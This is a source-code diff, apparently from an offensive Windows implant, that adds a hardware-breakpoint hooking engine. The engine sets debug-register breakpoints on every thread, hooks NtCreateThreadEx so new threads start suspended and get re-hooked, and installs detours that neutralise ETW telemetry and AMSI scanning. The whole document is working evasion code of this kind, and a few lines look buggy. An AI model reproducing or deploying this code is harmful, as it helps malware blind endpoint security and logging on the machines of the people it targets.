@@ -40,7 +40,7 @@ auto DECLFN HwbpEng::Install(
 
     Self->Krnl32.LeaveCriticalSection( &CritSec );
 
-    return Self->Hwbp->Insert( Address, Drx, TRUE, ThreadID );
+    return Self->Hw->Insert( Address, Drx, TRUE, ThreadID );
 }
 
 auto DECLFN HwbpEng::SetBreak(
@@ -80,7 +80,7 @@ auto DECLFN HwbpEng::SetBreak(
     return Code;
 }
 
-auto DECLFN HwbpEng::RmBreak(
+auto DECLFN HwbpEng::Uninstall(
     _In_ UPTR  Address,
     _In_ ULONG ThreadID
 ) -> BOOL {
@@ -198,7 +198,45 @@ auto DECLFN HwbpEng::Insert(
     _In_ BOOL  Init,
     _In_ ULONG ThreadID
 ) -> BOOL {
-    
+    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
+    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
+
+    ULONG RetLength = 0;
+    PVOID TmpValue  = NULL;
+    LONG  NtStatus  = STATUS_UNSUCCESSFUL;
+    BOOL  Flaged    = FALSE;
+
+    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, nullptr, 0, &RetLength );
+    if ( NtStatus != STATUS_INFO_LENGTH_MISMATCH ) return FALSE;
+
+    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( RetLength );
+    if ( !SysProcInfo ) return FALSE;
+
+    TmpValue = (PVOID)SysProcInfo;    
+
+    NtStatus = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, RetLength, &RetLength );
+    if ( NtStatus != STATUS_SUCCESS ) return FALSE;
+
+    while ( 1 ) {
+        SysThreadInfo = (PSYSTEM_THREAD_INFORMATION)SysProcInfo->Threads;
+
+        for  ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
+            if ( ThreadID != HW_ALL_THREADS && ThreadID != HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) ) 
+                continue;
+
+            if ( ! SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) );
+        }
+
+        if ( !SysProcInfo->NextEntryOffset ) break;
+
+        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
+    }
+
+    Flaged = TRUE;
+_KH_END:
+    if ( TmpValue ) Self->Hp->Free( TmpValue, RetLength );
+
+    return Flaged;
 }
 
 auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
@@ -212,7 +250,7 @@ auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
     Mem::Zero( U_PTR( Threads ), sizeof( DESCRIPTOR_HOOK ) );
 
     Handler = Self->Krnl32.AddVectoredExceptionHandler( 
-        1, (PVECTORED_EXCEPTION_HANDLER)&MainHandler 
+        1, (PVECTORED_EXCEPTION_HANDLER)MainHandler 
     );
 
     Self->Krnl32.InitializeCriticalSection( &CritSec );
@@ -229,7 +267,7 @@ auto DECLFN HwbpEng::Clean( VOID ) -> BOOL {
     PDESCRIPTOR_HOOK Current = Threads;
 
     while ( Current ) {
-        RmBreak( Current->Address, Current->ThreadID );
+        Uninstall( Current->Address, Current->ThreadID );
         Current = Current->Next;
     }
 
@@ -255,32 +293,113 @@ auto DECLFN HwbpEng::MainHandler(
     Self->Krnl32.EnterCriticalSection( &CritSec );
 
     while ( Current ) {
-        if ( Current->ThreadID != 0 && Current->ThreadID != Self->Session.ThreadID ) {
+        if ( Current->Address == e->ContextRecord->Rip && !Current->Processed ) {
+            if ( Current->ThreadID != 0 && Current->ThreadID != Self->Session.ThreadID ) {
+                Current->Processed = TRUE;
+            }
+    
+            if ( !SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
+                goto _KH_END;
+            }
+    
+            VOID ( *Detour )( PCONTEXT ) = Current->Detour;
+            Detour( e->ContextRecord );
+    
+            if ( !SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
+                goto _KH_END;
+            }
+    
             Current->Processed = TRUE;
         }
 
-        // if ( !SetBreak( Self->Session.ThreadID, Current->Address, Current->Detour, Current->Drx ) ) {
-            // goto _KH_END;
-        // }
-
-        VOID ( *Detour )( PCONTEXT ) = Current->Detour;
-        Detour( e->ContextRecord );
-
-        // if ( !SetBreak( Self->Session.ThreadID, Current->Address, Detour,  ) )
+        Current->Processed = FALSE;
+        Current = Current->Next;
     }
 
+    Self->Krnl32.LeaveCriticalSection( &CritSec );
+    Solutioned = TRUE;
+
 _KH_END:
-    return EXCEPTION_CONTINUE_SEARCH;
+    return ( Solutioned ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH );
 }
 
-auto DECLFN HwbpEng::Etw(
-    _In_ PEXCEPTION_POINTERS e
-) -> LONG {
+auto DECLFN HwbpEng::HookCallback(
+    _In_ PVOID Parameter,
+    _In_ BOOL  TimerWait
+) -> VOID {
+    PDESCRIPTOR_HOOK Current = Threads;
+    INT8   i      = 0;
+    HANDLE Handle = (HANDLE)( *(HANDLE*)Parameter );
 
+    while ( !Handle ) {}
+
+    Self->Krnl32.EnterCriticalSection( &CritSec );
+
+    while ( Current ) {
+        if ( Current->Address && Current->Detour && Current->ThreadID == HW_ALL_THREADS ) {
+            Install( Current->Address, Current->Drx, Current->Detour, Current->ThreadID ); i++; 
+        }
+
+        if ( i == 4 ) break;
+
+        Current = Current->Next;
+    }
+
+    Self->Krnl32.LeaveCriticalSection( &CritSec );
+    Self->Krnl32.ResumeThread( Handle );
 }
 
-auto DECLFN HwbpEng::Amsi(
-    _In_ PEXCEPTION_POINTERS e
-) -> LONG {
+auto DECLFN HwbpEng::AddNewThreads(
+    _In_ INT8 Drx
+) -> BOOL {
+    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)NtCreateThreadExHk, HW_ALL_THREADS );
+}
 
+auto DECLFN HwbpEng::RmNewThreads(
+    _In_ INT8 Drx
+) -> BOOL {
+    return Uninstall( U_PTR( Self->Ntdll.NtCreateThreadEx ), HW_ALL_THREADS );
+}
+
+auto DECLFN HwbpEng::NtCreateThreadExHk(
+    _In_ PCONTEXT Ctx
+) -> VOID {
+    HANDLE  Timer  = INVALID_HANDLE_VALUE;
+    PHANDLE Handle = (PHANDLE)GET_ARG_1( Ctx );
+    ULONG   Flags  = GET_ARG_7( Ctx );
+    Flags = Flags | THREAD_CREATE_FLAGS_CREATE_SUSPENDED;
+
+    SET_ARG_7( Ctx, Flags );
+
+    Self->Ntdll.RtlCreateTimer( &Timer, NULL, (WAITORTIMERCALLBACKFUNC)HookCallback, Handle, 0, 0, 0 );
+
+    CONTINUE_EXEC( Ctx );
+}
+
+auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
+    if( !Init() ) return FALSE;
+
+    Install( Self->Hw->Etw.Handle, Dr1, (PVOID)EtwDetour, HW_ALL_THREADS );
+    Install( Self->Hw->Amsi.Handle, Dr2, (PVOID)AmsiDetour, HW_ALL_THREADS );
+    return AddNewThreads( Dr0 );
+}
+
+auto DECLFN HwbpEng::DotnetExit( VOID ) -> BOOL {
+    return Clean();
+}
+
+auto DECLFN HwbpEng::EtwDetour(
+    _In_ PCONTEXT Ctx
+) -> VOID {
+    SET_ARG_3( Ctx, 0 );
+    BlockReal( Ctx );
+    CONTINUE_EXEC( Ctx );
+}
+
+auto DECLFN HwbpEng::AmsiDetour(
+    _In_ PCONTEXT Ctx
+) -> VOID {
+    SET_ARG_3( Ctx, 0 );
+    BlockReal( Ctx );
+    CONTINUE_EXEC( Ctx );
 }
